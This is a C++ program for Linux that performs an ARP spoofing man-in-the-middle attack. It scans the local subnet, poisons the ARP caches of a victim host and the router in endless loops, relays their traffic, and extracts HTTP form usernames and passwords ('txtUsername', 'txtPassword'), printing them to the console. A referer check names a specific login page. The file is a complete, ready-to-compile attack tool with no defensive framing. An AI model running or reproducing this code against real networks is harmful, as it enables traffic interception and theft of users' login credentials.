#include <iostream>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <iomanip>
#include <thread>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <netdb.h>        
#include <arpa/inet.h>    
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/unistd.h>  
#include <netinet/tcp.h>

using namespace std;
#define MIN(a, b) (((a) < (b)) ? (a) : (b))
#define BROADCAST_ADDR {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
#define MAC_LENGTH 6
#define IP_LENGTH 4
#define ETHER_HEADER_LENGTH 14
#define ETHER_ARP_LENGTH 28
#define ETHER_ARP_PACKET_LENGTH 42
#define IFNAME "ens33"
int finish_scan = 0;
char victim_ip[16];
char router_ip[16];  
unsigned char src_mac[MAC_LENGTH];
unsigned char victim_mac[MAC_LENGTH];
unsigned char router_mac[MAC_LENGTH];
char dst_ip[4], src_ip[4], rot_ip[4], vic_ip[4], atk_ip[4];
 int ifrindex;

/*
[Ethernet Frame Header] [ARP Header]
---------------------------------------------------------------------------------------------------------
|Destination MAC Address (6 bytes) | Source MAC Address   (6 bytes) | Protocol Type           (2 bytes) |
---------------------------------------------------------------------------------------------------------
|Hardware Type           (2 bytes) | Protocol Type        (2 bytes) | Hardware Address Length (1 byte)  |                                 
---------------------------------------------------------------------------------------------------------
│Protocol Address Length (1 byte)  | Operation Code       (2 bytes) │ Sender MAC Address      (6 bytes) |                                      
---------------------------------------------------------------------------------------------------------
│Sender IP Address       (4 bytes) | Target MAC Address   (6 bytes) │ Target IP Address       (4 bytes) |                                   
---------------------------------------------------------------------------------------------------------
*/

void socket_init(int& sd) {
	sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sd < 0) {
	cout << "Error on socket init!\n";
	exit(1);
	}
}
void getaddr(char* IP, unsigned char* MC, int& ifrindex) {
	const char* eth_name = IFNAME;
	struct ifreq ifr;
	int sd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sd < 0) {
		cout << "Error on socket init!\n";
		exit(1);
	}
	
	strcpy(ifr.ifr_name, eth_name);

	if (ioctl(sd, SIOCGIFADDR, &ifr) < 0) exit(1);
	memcpy(IP, ifr.ifr_addr.sa_data + 2, IP_LENGTH);

	if (ioctl(sd, SIOCGIFINDEX, &ifr) < 0) exit(1);
	ifrindex = ifr.ifr_ifindex;

	if (ioctl(sd, SIOCGIFHWADDR, &ifr) < 0) exit(1);
	memcpy(MC, ifr.ifr_hwaddr.sa_data, MAC_LENGTH);

	close(sd);
}
void print(unsigned char* ip, unsigned char* mac) {
	string IP = "";
	for (int i = 0; i < 4; i++) {
		if (i != 0) printf(".");
		printf("%d", ip[i]);
	}
	printf("\t\t");
	for (int j = 0; j < MAC_LENGTH; j++) {
	        if (j != 0) printf(":");
		printf("%02X", mac[j]);
	}
	printf("\n");

}
void arp_recv_print(int sd, char* src_ip, struct sockaddr_ll send_addr) {
    struct timeval tv = { 1, 0 };
    if (setsockopt(sd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0) {
        cout << "Error on recv_socket!\n";
    }

    unsigned char rbuf[80];
    while (true) {
        if (recvfrom(sd, rbuf, sizeof(rbuf), 0, NULL, NULL) < 0) {
            continue;
        }

        int ok = 1;
        for (int i = 38, j = 0; i < 38 + 4; i++, j++) {
            if ((unsigned int) rbuf[i] != (unsigned int) (unsigned char) src_ip[j]) {
                ok = false;
            }
        }
        if(rbuf[31] == 2) {
            memcpy(router_mac, rbuf + 22, MAC_LENGTH);
            memcpy(rot_ip, rbuf + 28,IP_LENGTH);
        } else if(rbuf[31] != 1&&rbuf[31] != 254){
            memcpy(victim_mac, rbuf + 22, MAC_LENGTH);
            memcpy(vic_ip, rbuf + 28,IP_LENGTH);
        }
        if (rbuf[31] == atk_ip[3] || rbuf[31] == 2) continue;
        print(rbuf + 28, rbuf + 22);
        if(rbuf[31] == 254) break;
    }
}
void arp_broadcast() {
    unsigned char dst_mac[MAC_LENGTH] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    struct in_addr src_in_addr, dst_in_addr;
    
    
    getaddr(src_ip, src_mac, ifrindex);
    for (int i = 0; i < 3; i++) {
        dst_ip[i] = src_ip[i];
        rot_ip[i] = src_ip[i];
        atk_ip[i] = src_ip[i];
    }
    rot_ip[3] = 2;
    atk_ip[3] = src_ip[3];
    char buf[ETHER_ARP_PACKET_LENGTH] = {0};

    struct ether_header* eth_header = (struct ether_header*) buf; //ether_header
    memcpy(eth_header -> ether_dhost, dst_mac, MAC_LENGTH);
    memcpy(eth_header -> ether_shost, src_mac, MAC_LENGTH);
    eth_header -> ether_type = htons(ETHERTYPE_ARP);    

    struct ether_arp* arp_packet = (struct ether_arp*) malloc(ETHER_ARP_LENGTH); //arp
    arp_packet -> arp_hrd = htons(ARPHRD_ETHER);
    arp_packet -> arp_pro = htons(ETHERTYPE_IP);
    arp_packet -> arp_hln = MAC_LENGTH;
    arp_packet -> arp_pln = IP_LENGTH;
    arp_packet -> arp_op  = htons(ARPOP_REQUEST);
    memcpy(arp_packet -> arp_sha, src_mac, MAC_LENGTH);
    memcpy(arp_packet -> arp_tha, dst_mac, MAC_LENGTH);
    memcpy(arp_packet -> arp_spa, src_ip, IP_LENGTH);
    memcpy(arp_packet -> arp_tpa, dst_ip, IP_LENGTH);
    memcpy(buf + ETHER_HEADER_LENGTH, arp_packet, ETHER_ARP_LENGTH);

    // Sockaddr
    struct sockaddr_ll send_addr;
    memset(&send_addr, 0, sizeof(send_addr));
    send_addr.sll_family = AF_PACKET;
    send_addr.sll_protocol = htons(ETH_P_ARP);
    send_addr.sll_pkttype = PACKET_BROADCAST;
    send_addr.sll_ifindex = ifrindex;
    send_addr.sll_halen = 0x06;
    memset(send_addr.sll_addr, 0xff, 6);

    int sd;
    socket_init(sd);
    thread receiver(arp_recv_print, sd, src_ip, send_addr);
    for (int i = 1; i <= 254; i++) {
        dst_ip[3] = i;
        memcpy(arp_packet -> arp_spa, src_ip, IP_LENGTH);
        memcpy(arp_packet -> arp_tpa, dst_ip, IP_LENGTH);
        memcpy(buf + ETHER_HEADER_LENGTH, arp_packet, ETHER_ARP_LENGTH);
        if (sendto(sd, buf, ETHER_ARP_PACKET_LENGTH, 0, (struct sockaddr*) &send_addr, sizeof(send_addr)) < 0) {
            cout << "Sendto Error!\n";    
        }
    }
    receiver.join();
    close(sd);
}

void arp_spoof(int sd, char* src_ip, char* dst_ip, unsigned char* src_mac, unsigned char* dst_mac) {
    char buf[ETHER_ARP_PACKET_LENGTH] = {0};
    struct ether_header* eth_header = (struct ether_header*) buf; //ether_header
    memcpy(eth_header -> ether_dhost, dst_mac, MAC_LENGTH);
    memcpy(eth_header -> ether_shost, src_mac, MAC_LENGTH);
    eth_header -> ether_type = htons(ETHERTYPE_ARP);    

    struct ether_arp* arp_packet = (struct ether_arp*) (buf + ETHER_HEADER_LENGTH); //arp
    arp_packet -> arp_hrd = htons(ARPHRD_ETHER);
    arp_packet -> arp_pro = htons(ETHERTYPE_IP);
    arp_packet -> arp_hln = MAC_LENGTH;
    arp_packet -> arp_pln = IP_LENGTH;
    arp_packet->arp_op  = htons(ARPOP_REPLY);
    memcpy(arp_packet -> arp_sha, src_mac, MAC_LENGTH);
    memcpy(arp_packet -> arp_tha, dst_mac, MAC_LENGTH);
    //memcpy(arp_packet -> arp_spa, src_ip, IP_LENGTH);
    //memcpy(arp_packet -> arp_tpa, dst_ip, IP_LENGTH);
    inet_pton(AF_INET, src_ip, arp_packet->arp_spa);
    inet_pton(AF_INET, dst_ip, arp_packet->arp_tpa);
    
   
    struct sockaddr_ll send_addr;
    memset(&send_addr, 0, sizeof(send_addr));
    send_addr.sll_family = AF_PACKET;
    send_addr.sll_protocol = htons(ETH_P_ARP);
    send_addr.sll_pkttype = PACKET_BROADCAST;
    send_addr.sll_ifindex = ifrindex;
    send_addr.sll_halen = 0x06;
    memset(send_addr.sll_addr, 0xff, 6);

    while (1) {
        if (sendto(sd, buf, ETHER_ARP_PACKET_LENGTH, 0, (struct sockaddr*) &send_addr, sizeof(send_addr)) < 0) {
            cout << "spoof Sendto Error!\n";    
        }
        sleep(3);
    }
}

void parse_http_packet(char* http_packet) {
	if (strncmp(http_packet, "HTTP/", 5) != 0) return;
	char* request_line = strtok(http_packet, "\r\n");
	if (request_line == NULL) return;
	char* headers = strtok(NULL, "\r\n\r\n");
	if (headers == NULL)  return;
	char* message_body = strtok(NULL, "");
	if (message_body == NULL) return;

	char* referer_pos = strstr(http_packet, "Referer: ");
	char* username = strstr(message_body, "txtUsername=");
	char* password = strstr(message_body, "txtPassword=");
	if(password == NULL) return;
	if (referer_pos != NULL) {
    		char* referer_value = referer_pos + strlen("Referer: ");
   	 	char* referer_end = strchr(referer_value, '\r');
    		if (referer_end != NULL) {
        		*referer_end = '\0'; 
        		char* referer = referer_value;
        		if (strncmp(referer, "http://vbsca.ca/login/login.asp", strlen("http://vbsca.ca/login/login.asp")) == 0) return;
        	}
    	}	
	//cout << message_body << endl;
	if (username) {
		username += strlen("txtUsername=");
		char* end_of_username = strchr(username, '&');
		if (end_of_username) {
		    	*end_of_username = '\0'; 
		}
		cout << "Username: " << username << endl;
	}
	if (password) {
		password += strlen("txtPassword=");
		char* end_of_username = strchr(username, '\r');
		if (end_of_username) {
		    	*end_of_username = '\0'; 
		}
		cout << "Password: " << password << endl;
	}
}

void arp_forward(int sd, unsigned char* my_mac) {
    unsigned char ip_buf[4096];
    int sd_ip;
    struct sockaddr_ll device = {};
    sd_ip = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sd_ip < 0){
        cout << "Error on IP socket init!\n";
        exit(1);
    }
    memset(&device, 0, sizeof(device));
    device.sll_ifindex = ifrindex;
    device.sll_family = AF_PACKET;
    device.sll_protocol = htons(ETH_P_ALL);
    device.sll_halen = ETH_ALEN;
    while (1){
    	
        int ip_len = recvfrom(sd_ip, ip_buf, sizeof(ip_buf), 0, NULL, NULL);
        if (ip_len < 0) {
            printf("no\n");
            continue;
        }
        struct ether_header *ip_eth_header = (struct ether_header *)ip_buf;
        if (ntohs(ip_eth_header->ether_type) == ETHERTYPE_IP) {  
            if (memcmp(ip_eth_header->ether_dhost, my_mac, ETH_ALEN) == 0) {
                if (memcmp(ip_eth_header->ether_shost, router_mac, ETH_ALEN) == 0) {
			memcpy(ip_eth_header->ether_dhost, victim_mac, ETH_ALEN);
			memcpy(ip_eth_header->ether_shost, my_mac, ETH_ALEN);
			int bytes_sent = 0;
		        int total_bytes = ip_len;
		        while (bytes_sent < total_bytes) {
		            int bytes_to_send = MIN(total_bytes - bytes_sent, 1024);
		            if (sendto(sd_ip, ip_buf + bytes_sent, bytes_to_send, 0, (struct sockaddr*)&device, sizeof(device)) < 0) {
		                perror("Error sending IP packet");
		                break;
		            }
		            bytes_sent += bytes_to_send;
		        }
                } else if (memcmp(ip_eth_header->ether_shost, victim_mac, ETH_ALEN) == 0) {
			memcpy(ip_eth_header->ether_dhost, router_mac, ETH_ALEN);
			memcpy(ip_eth_header->ether_shost, my_mac, ETH_ALEN);
			int bytes_sent = 0;
			int total_bytes = ip_len;
			while (bytes_sent < total_bytes) {
			    int bytes_to_send = MIN(total_bytes - bytes_sent, 1024);
			    if (sendto(sd_ip, ip_buf + bytes_sent, bytes_to_send, 0, (struct sockaddr*)&device, sizeof(device)) < 0) {
				perror("Error sending IP packet");
				break;
			    }
			    bytes_sent += bytes_to_send;
			}
                }
                
                int ip_hdr_len = (ip_buf[0] & 0x0F) * 4;
                struct tcphdr *tcp_header = (struct tcphdr *)(ip_buf + ip_hdr_len + sizeof(struct ether_header));
                int tcp_hdr_len = tcp_header->doff * 4;
                char *http_data = (char *)(ip_buf + ip_hdr_len + tcp_hdr_len + sizeof(struct ether_header));
                parse_http_packet(http_data);
                
            }
        }
    }
}



int main(int argc, char const *argv[]) {
	printf("Avalible devices:\n"); 
	printf("--------------------------------------\n");
	printf("IP                MAC                 \n");    
	printf("--------------------------------------\n");
	int sd;
	socket_init(sd);
	arp_broadcast();
	unsigned char vic_ip_un[4] = {0};
	unsigned char rot_ip_un[4] = {0};
	for (int i = 0; i < 4; ++i) {
	    	vic_ip_un[i] = static_cast<unsigned char>(vic_ip[i]);
	    	rot_ip_un[i] = static_cast<unsigned char>(rot_ip[i]);
	}
	sprintf(victim_ip, "%d.%d.%d.%d", vic_ip_un[0], vic_ip_un[1], vic_ip_un[2], vic_ip_un[3]);
	sprintf(router_ip, "%d.%d.%d.%d", rot_ip_un[0], rot_ip_un[1], rot_ip_un[2], rot_ip_un[3]);
	//cout << victim_ip << "\n" << router_ip << "\n";
	printf("\n");
	thread spoof_to_victim(arp_spoof, sd, victim_ip, router_ip, src_mac, router_mac);
	thread spoof_to_router(arp_spoof, sd, router_ip, victim_ip, src_mac, victim_mac);
	thread forward_packets(arp_forward,sd, src_mac);
	
	spoof_to_victim.join();
	spoof_to_router.join();
	forward_packets.join();


    return 0;
}